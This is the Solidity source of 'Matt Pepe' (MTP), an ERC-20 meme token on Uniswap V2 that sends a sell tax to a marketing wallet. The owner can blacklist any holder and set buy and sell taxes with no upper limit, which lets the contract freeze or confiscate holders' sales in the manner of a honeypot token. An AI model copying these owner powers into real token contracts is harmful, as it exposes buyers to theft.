1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.18;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
12         return msg.data;
13     }
14 }
15 
16 interface IERC20 {
17 
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 library SafeMath {
29 
30     function add(uint256 a, uint256 b) internal pure returns (uint256) {
31         uint256 c = a + b;
32         require(c >= a, "SafeMath: addition overflow");
33 
34         return c;
35     }
36 
37     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
38         return sub(a, b, "SafeMath: subtraction overflow");
39     }
40 
41     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
42         require(b <= a, errorMessage);
43         uint256 c = a - b;
44 
45         return c;
46     }
47 
48     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
49         if (a == 0) {
50             return 0;
51         }
52 
53         uint256 c = a * b;
54         require(c / a == b, "SafeMath: multiplication overflow");
55 
56         return c;
57     }
58 
59     function div(uint256 a, uint256 b) internal pure returns (uint256) {
60         return div(a, b, "SafeMath: division by zero");
61     }
62 
63     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
64         require(b > 0, errorMessage);
65         uint256 c = a / b;
66         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
67 
68         return c;
69     }
70 
71     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
72         return mod(a, b, "SafeMath: modulo by zero");
73     }
74 
75     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
76         require(b != 0, errorMessage);
77         return a % b;
78     }
79 }
80 
81 library Address {
82 
83     function isContract(address account) internal view returns (bool) {
84         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
85         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
86         // for accounts without code, i.e. `keccak256('')`
87         bytes32 codehash;
88         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
89         // solhint-disable-next-line no-inline-assembly
90         assembly { codehash := extcodehash(account) }
91         return (codehash != accountHash && codehash != 0x0);
92     }
93 
94     function sendValue(address payable recipient, uint256 amount) internal {
95         require(address(this).balance >= amount, "Address: insufficient balance");
96 
97         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
98         (bool success, ) = recipient.call{ value: amount }("");
99         require(success, "Address: unable to send value, recipient may have reverted");
100     }
101 
102     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
103       return functionCall(target, data, "Address: low-level call failed");
104     }
105 
106     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
107         return _functionCallWithValue(target, data, 0, errorMessage);
108     }
109 
110     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
111         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
112     }
113 
114     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
115         require(address(this).balance >= value, "Address: insufficient balance for call");
116         return _functionCallWithValue(target, data, value, errorMessage);
117     }
118 
119     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
120         require(isContract(target), "Address: call to non-contract");
121 
122         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
123         if (success) {
124             return returndata;
125         } else {
126             
127             if (returndata.length > 0) {
128                 assembly {
129                     let returndata_size := mload(returndata)
130                     revert(add(32, returndata), returndata_size)
131                 }
132             } else {
133                 revert(errorMessage);
134             }
135         }
136     }
137 }
138 
139 contract Ownable is Context {
140     address private _owner;
141 
142     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
143 
144     constructor () {
145         address msgSender = _msgSender();
146         _owner = msgSender;
147         emit OwnershipTransferred(address(0), msgSender);
148     }
149 
150     function owner() public view returns (address) {
151         return _owner;
152     }   
153     
154     modifier onlyOwner() {
155         require(_owner == _msgSender(), "Ownable: caller is not the owner");
156         _;
157     }
158     
159     function waiveOwnership() public virtual onlyOwner {
160         emit OwnershipTransferred(_owner, address(0));
161         _owner = address(0);
162     }
163 
164     function transferOwnership(address newOwner) public virtual onlyOwner {
165         require(newOwner != address(0), "Ownable: new owner is the zero address");
166         emit OwnershipTransferred(_owner, newOwner);
167         _owner = newOwner;
168     }
169 }
170 
171 interface IUniswapV2Factory {
172     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
173 
174     function feeTo() external view returns (address);
175     function feeToSetter() external view returns (address);
176 
177     function getPair(address tokenA, address tokenB) external view returns (address pair);
178     function allPairs(uint) external view returns (address pair);
179     function allPairsLength() external view returns (uint);
180 
181     function createPair(address tokenA, address tokenB) external returns (address pair);
182 
183     function setFeeTo(address) external;
184     function setFeeToSetter(address) external;
185 }
186 
187 interface IUniswapV2Pair {
188     event Approval(address indexed owner, address indexed spender, uint value);
189     event Transfer(address indexed from, address indexed to, uint value);
190 
191     function name() external pure returns (string memory);
192     function symbol() external pure returns (string memory);
193     function decimals() external pure returns (uint8);
194     function totalSupply() external view returns (uint);
195     function balanceOf(address owner) external view returns (uint);
196     function allowance(address owner, address spender) external view returns (uint);
197 
198     function approve(address spender, uint value) external returns (bool);
199     function transfer(address to, uint value) external returns (bool);
200     function transferFrom(address from, address to, uint value) external returns (bool);
201 
202     function DOMAIN_SEPARATOR() external view returns (bytes32);
203     function PERMIT_TYPEHASH() external pure returns (bytes32);
204     function nonces(address owner) external view returns (uint);
205 
206     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
207     
208     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
209     event Swap(
210         address indexed sender,
211         uint amount0In,
212         uint amount1In,
213         uint amount0Out,
214         uint amount1Out,
215         address indexed to
216     );
217     event Sync(uint112 reserve0, uint112 reserve1);
218 
219     function MINIMUM_LIQUIDITY() external pure returns (uint);
220     function factory() external view returns (address);
221     function token0() external view returns (address);
222     function token1() external view returns (address);
223     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
224     function price0CumulativeLast() external view returns (uint);
225     function price1CumulativeLast() external view returns (uint);
226     function kLast() external view returns (uint);
227 
228     function burn(address to) external returns (uint amount0, uint amount1);
229     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
230     function skim(address to) external;
231     function sync() external;
232 
233     function initialize(address, address) external;
234 }
235 
236 interface IUniswapV2Router01 {
237     function factory() external pure returns (address);
238     function WETH() external pure returns (address);
239 
240     function addLiquidity(
241         address tokenA,
242         address tokenB,
243         uint amountADesired,
244         uint amountBDesired,
245         uint amountAMin,
246         uint amountBMin,
247         address to,
248         uint deadline
249     ) external returns (uint amountA, uint amountB, uint liquidity);
250     function addLiquidityETH(
251         address token,
252         uint amountTokenDesired,
253         uint amountTokenMin,
254         uint amountETHMin,
255         address to,
256         uint deadline
257     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
258     function removeLiquidity(
259         address tokenA,
260         address tokenB,
261         uint liquidity,
262         uint amountAMin,
263         uint amountBMin,
264         address to,
265         uint deadline
266     ) external returns (uint amountA, uint amountB);
267     function removeLiquidityETH(
268         address token,
269         uint liquidity,
270         uint amountTokenMin,
271         uint amountETHMin,
272         address to,
273         uint deadline
274     ) external returns (uint amountToken, uint amountETH);
275     function removeLiquidityWithPermit(
276         address tokenA,
277         address tokenB,
278         uint liquidity,
279         uint amountAMin,
280         uint amountBMin,
281         address to,
282         uint deadline,
283         bool approveMax, uint8 v, bytes32 r, bytes32 s
284     ) external returns (uint amountA, uint amountB);
285     function removeLiquidityETHWithPermit(
286         address token,
287         uint liquidity,
288         uint amountTokenMin,
289         uint amountETHMin,
290         address to,
291         uint deadline,
292         bool approveMax, uint8 v, bytes32 r, bytes32 s
293     ) external returns (uint amountToken, uint amountETH);
294     function swapExactTokensForTokens(
295         uint amountIn,
296         uint amountOutMin,
297         address[] calldata path,
298         address to,
299         uint deadline
300     ) external returns (uint[] memory amounts);
301     function swapTokensForExactTokens(
302         uint amountOut,
303         uint amountInMax,
304         address[] calldata path,
305         address to,
306         uint deadline
307     ) external returns (uint[] memory amounts);
308     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
309         external
310         payable
311         returns (uint[] memory amounts);
312     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
313         external
314         returns (uint[] memory amounts);
315     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
316         external
317         returns (uint[] memory amounts);
318     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
319         external
320         payable
321         returns (uint[] memory amounts);
322 
323     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
324     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
325     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
326     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
327     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
328 }
329 
330 interface IUniswapV2Router02 is IUniswapV2Router01 {
331     function removeLiquidityETHSupportingFeeOnTransferTokens(
332         address token,
333         uint liquidity,
334         uint amountTokenMin,
335         uint amountETHMin,
336         address to,
337         uint deadline
338     ) external returns (uint amountETH);
339     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
340         address token,
341         uint liquidity,
342         uint amountTokenMin,
343         uint amountETHMin,
344         address to,
345         uint deadline,
346         bool approveMax, uint8 v, bytes32 r, bytes32 s
347     ) external returns (uint amountETH);
348 
349     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
350         uint amountIn,
351         uint amountOutMin,
352         address[] calldata path,
353         address to,
354         uint deadline
355     ) external;
356     function swapExactETHForTokensSupportingFeeOnTransferTokens(
357         uint amountOutMin,
358         address[] calldata path,
359         address to,
360         uint deadline
361     ) external payable;
362     function swapExactTokensForETHSupportingFeeOnTransferTokens(
363         uint amountIn,
364         uint amountOutMin,
365         address[] calldata path,
366         address to,
367         uint deadline
368     ) external;
369 }
370 
371 contract MTP is Context, IERC20, Ownable {
372     
373     using SafeMath for uint256;
374     using Address for address;
375     
376     string private _name = "Matt Pepe";
377     string private _symbol = "MTP";
378     uint8 private _decimals = 18;
379 
380     address payable public marketingWallet = payable(0x002170ae4186aC7402d27F2E3f8a86E6E503E252);
381 
382     address public deadAddress = 0x000000000000000000000000000000000000dEaD;
383     
384     mapping (address => uint256) _balances;
385     mapping (address => mapping (address => uint256)) private _allowances;
386     
387     mapping (address => bool) public isExcludedFromFee;
388     mapping (address => bool) public isMarketPair;
389     mapping(address => bool) public _isBlacklisted;
390 
391     uint256 public buyTax = 0;
392     uint256 public sellTax = 2;
393 
394     uint256 private _totalSupply = 1979000000000000 * 10 ** _decimals;
395     uint256 private minimumTokensBeforeSwap = 200000000000 * 10 ** _decimals; 
396 
397     IUniswapV2Router02 public uniswapV2Router;
398     address public uniswapPair;
399     
400     bool inSwapAndLiquify;
401     bool public swapAndLiquifyEnabled = true;
402     bool public swapAndLiquifyByLimitOnly = false;
403 
404     event SwapAndLiquifyEnabledUpdated(bool enabled);
405     event SwapAndLiquify(
406         uint256 tokensSwapped,
407         uint256 ethReceived,
408         uint256 tokensIntoLiqudity
409     );
410     
411     event SwapETHForTokens(
412         uint256 amountIn,
413         address[] path
414     );
415     
416     event SwapTokensForETH(
417         uint256 amountIn,
418         address[] path
419     );
420     
421     modifier lockTheSwap {
422         inSwapAndLiquify = true;
423         _;
424         inSwapAndLiquify = false;
425     }
426     
427     constructor () {
428         
429         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
430 
431         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
432             .createPair(address(this), _uniswapV2Router.WETH());
433 
434         uniswapV2Router = _uniswapV2Router;
435         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
436 
437         isExcludedFromFee[owner()] = true;
438         isExcludedFromFee[address(this)] = true;
439         isExcludedFromFee[deadAddress] = true;
440         isExcludedFromFee[marketingWallet] = true;
441 
442         isMarketPair[address(uniswapPair)] = true;
443 
444         _balances[_msgSender()] = _totalSupply;
445         emit Transfer(address(0), _msgSender(), _totalSupply);
446     }
447 
448     function name() public view returns (string memory) {
449         return _name;
450     }
451 
452     function symbol() public view returns (string memory) {
453         return _symbol;
454     }
455 
456     function decimals() public view returns (uint8) {
457         return _decimals;
458     }
459 
460     function totalSupply() public view override returns (uint256) {
461         return _totalSupply;
462     }
463 
464     function balanceOf(address account) public view override returns (uint256) {
465         return _balances[account];
466     }
467 
468     function allowance(address owner, address spender) public view override returns (uint256) {
469         return _allowances[owner][spender];
470     }
471 
472     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
473         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
474         return true;
475     }
476 
477     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
478         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
479         return true;
480     }
481 
482     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
483         return minimumTokensBeforeSwap;
484     }
485 
486     function approve(address spender, uint256 amount) public override returns (bool) {
487         _approve(_msgSender(), spender, amount);
488         return true;
489     }
490 
491     function _approve(address owner, address spender, uint256 amount) private {
492         require(owner != address(0), "ERC20: approve from the zero address");
493         require(spender != address(0), "ERC20: approve to the zero address");
494 
495         _allowances[owner][spender] = amount;
496         emit Approval(owner, spender, amount);
497     }
498 
499     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
500         isExcludedFromFee[account] = newValue;
501     }
502 
503     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
504         minimumTokensBeforeSwap = newLimit;
505     }
506 
507     function getCirculatingSupply() public view returns (uint256) {
508         return _totalSupply.sub(balanceOf(deadAddress));
509     }
510 
511     //to recieve ETH from uniswapV2Router when swaping
512     receive() external payable {}
513 
514     function transfer(address recipient, uint256 amount) public override returns (bool) {
515         _transfer(_msgSender(), recipient, amount);
516         return true;
517     }
518 
519     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
520         _transfer(sender, recipient, amount);
521         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
522         return true;
523     }
524 
525     function blacklistAddress(address account, bool value) external onlyOwner{
526         _isBlacklisted[account] = value;
527     }
528 
529     function setBuyTax(uint256 newTax) external onlyOwner() {
530         buyTax = newTax;
531     }
532 
533     function setSellTax(uint256 newTax) external onlyOwner() {
534         sellTax = newTax;
535     }
536     
537     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
538 
539         require(sender != address(0), "ERC20: transfer from the zero address");
540         require(recipient != address(0), "ERC20: transfer to the zero address");
541         require(!_isBlacklisted[sender] && !_isBlacklisted[recipient], 'Blacklisted address');
542 
543         if(inSwapAndLiquify)
544         { 
545             return _basicTransfer(sender, recipient, amount); 
546         }
547         else
548         {
549             uint256 contractTokenBalance = balanceOf(address(this));
550             bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
551             
552             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled && recipient!=owner()) 
553             {
554                 if(swapAndLiquifyByLimitOnly)
555                     contractTokenBalance = minimumTokensBeforeSwap;
556                 swapAndLiquify(contractTokenBalance);    
557             }
558 
559             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
560 
561             uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
562                                          amount : takeFee(sender,recipient, amount);
563 
564             _balances[recipient] = _balances[recipient].add(finalAmount);
565 
566             emit Transfer(sender, recipient, finalAmount);
567             return true;
568         }
569     }
570 
571     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
572         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
573         _balances[recipient] = _balances[recipient].add(amount);
574         emit Transfer(sender, recipient, amount);
575         return true;
576     }
577     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
578     
579         swapTokensForBNB(tAmount);
580         uint256 BNBBalance = address(this).balance;
581     
582         if(BNBBalance > 0)
583             transferToAddressETH(marketingWallet,BNBBalance);
584     }
585 
586 
587     function transferToAddressETH(address payable recipient, uint256 amount) private {
588         recipient.transfer(amount);
589     }
590 
591     function swapTokensForBNB(uint256 tokenAmount) private {
592         // generate the uniswap pair path of token -> weth
593         address[] memory path = new address[](2);
594         path[0] = address(this);
595         path[1] = uniswapV2Router.WETH();
596 
597         _approve(address(this), address(uniswapV2Router), tokenAmount);
598 
599         // make the swap
600         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
601             tokenAmount,
602             0, // accept any amount of ETH
603             path,
604             address(this),
605             block.timestamp
606         );
607     }
608 
609     function takeFee(address sender,address recipient,uint256 amount) internal returns (uint256) {
610         uint256 feeAmount = 0;
611            
612         if(isMarketPair[sender]) {
613             feeAmount = amount.mul(buyTax).div(100);
614         }
615         else if(isMarketPair[recipient]) {
616             feeAmount = amount.mul(sellTax).div(100);
617         }
618         
619         if(feeAmount > 0) {
620             _balances[address(this)] = _balances[address(this)].add(feeAmount);
621             emit Transfer(sender, address(this), feeAmount);
622         }
623 
624         return amount.sub(feeAmount);
625     }
626     
627 }